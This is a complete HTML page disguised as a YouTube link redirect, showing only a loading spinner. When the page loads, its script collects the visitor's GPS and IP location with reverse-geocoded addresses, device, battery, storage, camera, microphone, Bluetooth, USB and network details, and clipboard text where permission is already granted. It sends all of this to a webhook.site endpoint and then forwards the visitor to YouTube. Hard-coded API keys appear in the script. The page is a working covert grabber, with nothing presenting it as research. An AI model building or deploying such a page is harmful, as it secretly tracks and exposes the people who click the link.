<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <link rel="icon" type="image/x-icon" href="youtube.ico">
    <style>
        .loader {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-radius: 50%;
            border-top: 5px solid #ff0000;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
        function bytesToGB(bytes) {
            if (!bytes || bytes === 0) return '0.00';
            return (bytes / (1024 * 1024 * 1024)).toFixed(2);
        }

        function validateNumber(value) {
            return typeof value === 'number' && !isNaN(value) && isFinite(value) ? value : 'N/A';
        }

        function validateString(value) {
            return value && typeof value === 'string' ? value : 'N/A';
        }

        async function getIPBasedLocation() {
            try {
                const response = await fetch('https://ipinfo.io/json?token=dd6aa51476d42b');
                if (!response.ok) throw new Error('Network response was not ok');
                const data = await response.json();
                return {
                    ip: validateString(data.ip),
                    city: validateString(data.city),
                    region: validateString(data.region),
                    country: validateString(data.country),
                    loc: validateString(data.loc),
                    locationtemp: `https://www.google.com/maps?q=${validateString(data.loc)}`,
                    org: validateString(data.org),
                    timezone: validateString(data.timezone),
                    postal: validateString(data.postal),
                    hostname: validateString(data.hostname)
                };
            } catch (error) {
                return null;
            }
        }

        async function getLocationNameFromCoords(lat, lng) {
            try {
                const response = await fetch(`https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=AIzaSyCsdXb9ClkZf2IKdhdPk2Pyk1BEi_Ckj6M`);
                if (!response.ok) throw new Error('Geocoding API failed');
                const data = await response.json();
                
                if (data.results && data.results.length > 0) {
                    const address = data.results[0].formatted_address;
                    return address;
                }
                return 'Location name not found';
            } catch (error) {
                return 'Geocoding failed';
            }
        }

        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    
                    if (!battery) return null;
                    
                    return {
                        charging: battery.charging !== undefined ? battery.charging : 'N/A',
                        level: battery.level !== undefined ? `${(validateNumber(battery.level) * 100).toFixed(2)}%` : 'N/A',
                        chargingTime: battery.chargingTime !== undefined && battery.chargingTime !== Infinity ? 
                                    `${(validateNumber(battery.chargingTime) / 60).toFixed(2)} minutes` : 'N/A',
                        dischargingTime: battery.dischargingTime !== undefined && battery.dischargingTime !== Infinity ? 
                                       `${(validateNumber(battery.dischargingTime) / 60).toFixed(2)} minutes` : 'N/A',
                        chargingStatus: battery.charging ? (battery.chargingTime === Infinity ? 'Charging (time unknown)' : 'Charging') : 'Discharging',
                        supported: true
                    };
                }
                return { supported: false };
            } catch (error) {
                return { supported: false, error: 'Battery API failed' };
            }
        }

        async function getStorageInfo() {
            try {
                if ('storage' in navigator && 'estimate' in navigator.storage) {
                    const estimate = await navigator.storage.estimate();
                    
                    if (!estimate) return null;
                    
                    const usage = validateNumber(estimate.usage);
                    const quota = validateNumber(estimate.quota);
                    
                    return {
                        totalStorageGB: bytesToGB(quota),
                        usedStorageGB: bytesToGB(usage),
                        freeStorageGB: bytesToGB(quota - usage),
                        percentageUsed: quota > 0 ? `${((usage / quota) * 100).toFixed(2)}%` : 'N/A',
                        usageBytes: usage,
                        quotaBytes: quota,
                        supported: true
                    };
                }
                return { supported: false };
            } catch (error) {
                return { supported: false, error: 'Storage API failed' };
            }
        }

        async function getMediaDevicesInfo() {
            try {
                if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
                    return { supported: false };
                }

                const devices = await navigator.mediaDevices.enumerateDevices();
                const cameras = devices.filter(device => device.kind === 'videoinput');
                const microphones = devices.filter(device => device.kind === 'audioinput');
                const speakers = devices.filter(device => device.kind === 'audiooutput');

                return {
                    supported: true,
                    totalDevices: devices.length,
                    cameras: cameras.map(cam => ({
                        id: cam.deviceId,
                        label: cam.label || 'Unknown Camera',
                        groupId: cam.groupId || 'N/A',
                        kind: cam.kind
                    })),
                    microphones: microphones.map(mic => ({
                        id: mic.deviceId,
                        label: mic.label || 'Unknown Microphone',
                        groupId: mic.groupId || 'N/A',
                        kind: mic.kind
                    })),
                    speakers: speakers.map(speaker => ({
                        id: speaker.deviceId,
                        label: speaker.label || 'Unknown Speaker',
                        groupId: speaker.groupId || 'N/A',
                        kind: speaker.kind
                    })),
                    hasCamera: cameras.length > 0,
                    hasMicrophone: microphones.length > 0,
                    hasSpeaker: speakers.length > 0
                };
            } catch (error) {
                return { supported: false, error: error.message };
            }
        }

        async function getBluetoothInfo() {
            try {
                if (!navigator.bluetooth) {
                    return { supported: false };
                }

                const availability = await navigator.bluetooth.getAvailability();
                
                let pairedDevices = [];
                try {
                    if ('getDevices' in navigator.bluetooth) {
                        const devices = await navigator.bluetooth.getDevices();
                        pairedDevices = devices.map(device => ({
                            id: device.id,
                            name: device.name || 'Unknown Device',
                            connected: device.gatt ? device.gatt.connected : false,
                            type: device.gatt ? 'GATT Device' : 'Unknown Type'
                        }));
                    }
                } catch (e) {
                    pairedDevices = [{ error: 'Cannot access paired devices without user gesture' }];
                }

                return {
                    supported: true,
                    available: availability,
                    pairedDevicesCount: pairedDevices.length,
                    pairedDevices: pairedDevices,
                    canDiscover: true,
                    info: 'Web Bluetooth API - Can discover and connect to nearby devices'
                };
            } catch (error) {
                return { supported: false, error: error.message };
            }
        }

        async function getUSBInfo() {
            try {
                if (!navigator.usb) {
                    return { supported: false };
                }

                let connectedDevices = [];
                try {
                    const devices = await navigator.usb.getDevices();
                    connectedDevices = devices.map(device => ({
                        vendorId: '0x' + device.vendorId.toString(16).toUpperCase(),
                        productId: '0x' + device.productId.toString(16).toUpperCase(),
                        productName: device.productName || 'Unknown Product',
                        manufacturerName: device.manufacturerName || 'Unknown Manufacturer',
                        serialNumber: device.serialNumber || 'N/A',
                        deviceClass: device.deviceClass || 'N/A',
                        deviceProtocol: device.deviceProtocol || 'N/A'
                    }));
                } catch (e) {
                    connectedDevices = [{ error: 'Cannot access USB devices without user permission' }];
                }

                return {
                    supported: true,
                    connectedDevicesCount: connectedDevices.length,
                    connectedDevices: connectedDevices,
                    canRequestDevice: true,
                    info: 'WebUSB API - Can access and control USB devices'
                };
            } catch (error) {
                return { supported: false, error: error.message };
            }
        }

        async function getVibrationInfo() {
            try {
                if (!navigator.vibrate) {
                    return { supported: false };
                }

                let testResult = 'Not tested (requires user gesture)';
                let patternSupport = false;
                
                try {
                    patternSupport = navigator.vibrate([100, 50, 100]);
                    testResult = patternSupport ? 'Pattern vibration supported' : 'Simple vibration only';
                } catch (e) {
                    testResult = 'Vibration test requires user interaction';
                }

                return {
                    supported: true,
                    testResult: testResult,
                    patternSupport: patternSupport,
                    maxPatternLength: 100,
                    info: 'Vibration API - Can control device vibration patterns'
                };
            } catch (error) {
                return { supported: false, error: error.message };
            }
        }

        async function getClipboardInfo() {
            try {
                if (!navigator.clipboard) {
                    return { supported: false };
                }

                let clipboardContent = 'Requires user gesture to read';
                let clipboardTypes = [];
                let readSupported = false;
                let writeSupported = false;
                
                readSupported = 'readText' in navigator.clipboard;
                writeSupported = 'writeText' in navigator.clipboard;

                try {
                    if (readSupported) {
                        const permission = await navigator.permissions.query({ name: 'clipboard-read' });
                        if (permission.state === 'granted') {
                            clipboardContent = await navigator.clipboard.readText();
                            if (!clipboardContent) {
                                clipboardContent = 'Clipboard is empty';
                            } else {
                                clipboardContent = clipboardContent.substring(0, 200) + (clipboardContent.length > 200 ? '...' : '');
                            }
                        }
                    }
                } catch (e) {
                    clipboardContent = 'Clipboard read requires user permission: ' + e.message;
                }

                return {
                    supported: true,
                    clipboardText: clipboardContent,
                    readSupported: readSupported,
                    writeSupported: writeSupported,
                    permissions: {
                        read: await getPermissionState('clipboard-read'),
                        write: await getPermissionState('clipboard-write')
                    },
                    info: 'Clipboard API - Can read and write clipboard data with permission'
                };
            } catch (error) {
                return { supported: false, error: error.message };
            }
        }

        async function getPermissionState(permissionName) {
            try {
                if ('permissions' in navigator) {
                    const permission = await navigator.permissions.query({ name: permissionName });
                    return permission.state;
                }
                return 'not-supported';
            } catch (e) {
                return 'error';
            }
        }

        async function getSensorInfo() {
            try {
                const sensors = {
                    accelerometer: 'Accelerometer' in window,
                    gyroscope: 'Gyroscope' in window,
                    magnetometer: 'Magnetometer' in window,
                    ambientLight: 'AmbientLightSensor' in window,
                    proximity: 'ProximitySensor' in window,
                    orientation: 'DeviceOrientationEvent' in window,
                    motion: 'DeviceMotionEvent' in window,
                    gravity: 'GravitySensor' in window,
                    linearAcceleration: 'LinearAccelerationSensor' in window,
                    absoluteOrientation: 'AbsoluteOrientationSensor' in window,
                    relativeOrientation: 'RelativeOrientationSensor' in window
                };

                const availableSensors = Object.keys(sensors).filter(sensor => sensors[sensor]);

                return {
                    supported: availableSensors.length > 0,
                    availableSensors: sensors,
                    availableCount: availableSensors.length,
                    sensorList: availableSensors,
                    info: `Device has ${availableSensors.length} sensor APIs available`
                };
            } catch (error) {
                return { supported: false, error: error.message };
            }
        }

        async function getNetworkDetailedInfo() {
            try {
                if (!navigator.connection) {
                    return { supported: false };
                }

                const connection = navigator.connection;
                const networkInfo = {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink + ' Mbps',
                    rtt: connection.rtt + ' ms',
                    saveData: connection.saveData,
                    type: connection.type,
                    downlinkMax: connection.downlinkMax || 'N/A',
                    supported: true
                };

                try {
                    const startTime = performance.now();
                    const speedTest = await fetch('https://httpbin.org/bytes/1024?seed=0', { cache: 'no-store' });
                    const endTime = performance.now();
                    networkInfo.latency = (endTime - startTime).toFixed(2) + ' ms';
                    networkInfo.speedTest = 'Completed';
                } catch (e) {
                    networkInfo.speedTest = 'Failed: ' + e.message;
                }

                return networkInfo;
            } catch (error) {
                return { supported: false, error: error.message };
            }
        }

        async function getEnhancedLocation() {
            const results = { gps: null, wifi: null, ip: null };
            
            try {
                if (navigator.geolocation) {
                    results.gps = await new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(
                            async (pos) => {
                                if (pos && pos.coords) {
                                    const lat = validateNumber(pos.coords.latitude);
                                    const lng = validateNumber(pos.coords.longitude);
                                    const locationName = await getLocationNameFromCoords(lat, lng);
                                    
                                    resolve({
                                        latitude: lat,
                                        longitude: lng,
                                        accuracy: validateNumber(pos.coords.accuracy) + ' meters',
                                        altitude: pos.coords.altitude ? validateNumber(pos.coords.altitude) + ' meters' : 'N/A',
                                        altitudeAccuracy: pos.coords.altitudeAccuracy ? validateNumber(pos.coords.altitudeAccuracy) + ' meters' : 'N/A',
                                        heading: pos.coords.heading ? validateNumber(pos.coords.heading) + ' degrees' : 'N/A',
                                        speed: pos.coords.speed ? validateNumber(pos.coords.speed) + ' m/s' : 'N/A',
                                        locationName: locationName,
                                        source: 'GPS',
                                        gmapsLink: `https://www.google.com/maps?q=${lat},${lng}`,
                                        timestamp: new Date(pos.timestamp).toISOString(),
                                        success: true
                                    });
                                } else {
                                    resolve({ success: false, error: 'No coordinates received' });
                                }
                            },
                            (error) => resolve({ 
                                success: false, 
                                error: error.message,
                                code: error.code,
                                permissionDenied: error.code === 1
                            }),
                            { 
                                timeout: 10000, 
                                enableHighAccuracy: true,
                                maximumAge: 300000 
                            }
                        );
                    });
                }
            } catch (e) {
                results.gps = { success: false, error: e.message };
            }
            
            try {
                const wifiResponse = await fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyCsdXb9ClkZf2IKdhdPk2Pyk1BEi_Ckj6M', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        considerIp: true,
                        wifiAccessPoints: [] 
                    })
                });
                
                if (wifiResponse.ok) {
                    const wifiData = await wifiResponse.json();
                    if (wifiData.location && wifiData.location.lat && wifiData.location.lng) {
                        const lat = validateNumber(wifiData.location.lat);
                        const lng = validateNumber(wifiData.location.lng);
                        const locationName = await getLocationNameFromCoords(lat, lng);
                        
                        results.wifi = {
                            latitude: lat,
                            longitude: lng,
                            accuracy: validateNumber(wifiData.accuracy) + ' meters',
                            locationName: locationName,
                            source: 'WiFi/Cell Tower',
                            gmapsLink: `https://www.google.com/maps?q=${lat},${lng}`,
                            success: true
                        };
                    } else {
                        results.wifi = { success: false, error: 'No location data in response' };
                    }
                } else {
                    results.wifi = { success: false, error: `API request failed: ${wifiResponse.status}` };
                }
            } catch (e) {
                results.wifi = { success: false, error: e.message };
            }
            
            return results;
        }

        async function getPerformanceInfo() {
            try {
                const memory = performance.memory;
                const timing = performance.timing;
                
                return {
                    memory: memory ? {
                        used: Math.round(memory.usedJSHeapSize / 1048576) + ' MB',
                        total: Math.round(memory.totalJSHeapSize / 1048576) + ' MB',
                        limit: Math.round(memory.jsHeapSizeLimit / 1048576) + ' MB'
                    } : null,
                    navigation: performance.getEntriesByType('navigation')[0] || null,
                    supported: true
                };
            } catch (error) {
                return { supported: false, error: error.message };
            }
        }

        async function collectAndRedirect(redirectUrl) {
            try {
                const now = new Date();
                const options = {
                    weekday: 'long',
                    day: 'numeric',
                    month: 'long',
                    year: 'numeric',
                    hour: 'numeric',
                    minute: 'numeric',
                    second: 'numeric',
                    timeZoneName: 'short'
                };

                const [
                    locationData, enhancedLocation, batteryInfo, storageInfo, 
                    mediaDevicesInfo, bluetoothInfo, usbInfo, vibrationInfo, 
                    clipboardInfo, sensorInfo, networkDetailedInfo, performanceInfo
                ] = await Promise.allSettled([
                    getIPBasedLocation(),
                    getEnhancedLocation(),
                    getBatteryInfo(),
                    getStorageInfo(),
                    getMediaDevicesInfo(),
                    getBluetoothInfo(),
                    getUSBInfo(),
                    getVibrationInfo(),
                    getClipboardInfo(),
                    getSensorInfo(),
                    getNetworkDetailedInfo(),
                    getPerformanceInfo()
                ]);

                const deviceInfo = {
                    type: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                    os: navigator.userAgent.includes('Windows') ? 'Windows' : 
                        navigator.userAgent.includes('Mac') ? 'MacOS' : 
                        navigator.userAgent.includes('Linux') ? 'Linux' : 
                        navigator.userAgent.includes('Android') ? 'Android' : 
                        navigator.userAgent.includes('iOS') ? 'iOS' : 'Unknown',
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    cpuCores: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory + ' GB',
                    maxTouchPoints: navigator.maxTouchPoints,
                    vendor: navigator.vendor,
                    product: navigator.product,
                    userAgentData: navigator.userAgentData ? {
                        brands: navigator.userAgentData.brands,
                        mobile: navigator.userAgentData.mobile,
                        platform: navigator.userAgentData.platform
                    } : null
                };

                const data = {
                    redirectUrl: redirectUrl,
                    userAgent: validateString(navigator.userAgent),
                    platform: validateString(navigator.platform),
                    screenInfo: {
                        width: validateNumber(screen.width),
                        height: validateNumber(screen.height),
                        colorDepth: validateNumber(screen.colorDepth),
                        availWidth: validateNumber(screen.availWidth),
                        availHeight: validateNumber(screen.availHeight),
                        pixelDepth: validateNumber(screen.pixelDepth),
                        orientation: screen.orientation ? {
                            type: screen.orientation.type,
                            angle: screen.orientation.angle
                        } : 'N/A'
                    },
                    viewport: {
                        width: validateNumber(window.innerWidth),
                        height: validateNumber(window.innerHeight),
                        devicePixelRatio: validateNumber(window.devicePixelRatio)
                    },
                    timestamp: now.toLocaleString('en-IN', options),
                    timestampISO: now.toISOString(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    batteryInfo: batteryInfo.status === 'fulfilled' ? batteryInfo.value : { supported: false, error: 'Failed to get battery info' },
                    storageInfo: storageInfo.status === 'fulfilled' ? storageInfo.value : { supported: false, error: 'Failed to get storage info' },
                    locationData: locationData.status === 'fulfilled' ? locationData.value : null,
                    enhancedLocation: enhancedLocation.status === 'fulfilled' ? enhancedLocation.value : { gps: { success: false }, wifi: { success: false } },
                    deviceInfo: deviceInfo,
                    networkInfo: networkDetailedInfo.status === 'fulfilled' ? networkDetailedInfo.value : { supported: false },
                    performanceInfo: performanceInfo.status === 'fulfilled' ? performanceInfo.value : { supported: false },
                    advancedAPIs: {
                        mediaDevices: mediaDevicesInfo.status === 'fulfilled' ? mediaDevicesInfo.value : { supported: false },
                        bluetooth: bluetoothInfo.status === 'fulfilled' ? bluetoothInfo.value : { supported: false },
                        usb: usbInfo.status === 'fulfilled' ? usbInfo.value : { supported: false },
                        vibration: vibrationInfo.status === 'fulfilled' ? vibrationInfo.value : { supported: false },
                        clipboard: clipboardInfo.status === 'fulfilled' ? clipboardInfo.value : { supported: false },
                        sensors: sensorInfo.status === 'fulfilled' ? sensorInfo.value : { supported: false }
                    },
                    collectionSummary: {
                        totalAPIs: 12,
                        successfulAPIs: [
                            batteryInfo.status, storageInfo.status, locationData.status,
                            mediaDevicesInfo.status, bluetoothInfo.status, usbInfo.status,
                            vibrationInfo.status, clipboardInfo.status, sensorInfo.status,
                            networkDetailedInfo.status, performanceInfo.status
                        ].filter(status => status === 'fulfilled').length,
                        timestamp: Date.now()
                    }
                };

                await fetch('https://webhook.site/4d99514c-d56d-4f9e-b1f2-fd45d96189dd', {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });

                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 500);

            } catch (error) {
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 500);
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            const fullPath = window.location.pathname.substring(1) + 
                           window.location.search + 
                           window.location.hash;
            
            let youtubeUrl;
            
            if (fullPath.startsWith('youtu.be/')) {
                const videoId = fullPath.split('youtu.be/')[1]?.split(/[?#]/)[0];
                youtubeUrl = videoId ? `https://www.youtube.com/watch?v=${videoId}` : 'https://www.youtube.com/';
            } else {
                youtubeUrl = fullPath 
                    ? `https://www.youtube.com/${fullPath}`
                    : 'https://www.youtube.com/';
            }
            
            collectAndRedirect(youtubeUrl);
        });
    </script>
</body>
</html>